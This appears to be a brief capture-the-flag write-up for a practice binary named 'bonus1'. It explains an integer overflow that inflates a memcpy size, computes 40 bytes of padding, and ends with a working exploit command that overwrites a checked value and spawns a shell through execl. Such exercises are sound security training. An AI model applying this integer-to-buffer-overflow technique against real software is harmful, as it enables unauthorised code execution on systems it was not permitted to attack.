In .rodata we can find "sh" and "/bin/sh"
There is only main function

Executing, it seems to segfault without argument and it doesn't with at least 1 arg
see reverse_engineer.c

delphin calculations + some tweaking: -1073741814 as input gives 40 to memcpy

buffer start: 0xbffff6b0
address we need to overwrite : 0xbffff6ec

padding to reach address : 0x3C (60)
-1073741809 gives 60 to memcpy size

after messing around, it seems that we need 40 bytes to reach address:

-1073741809
"A"*40 + "\x46\x4c\x4f\x57"

These values work and we successfully get into the execl, we thought the "sh" argument had to be a file, but nope it works as if and opens a shell

final command:
./bonus1 -1073741809 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
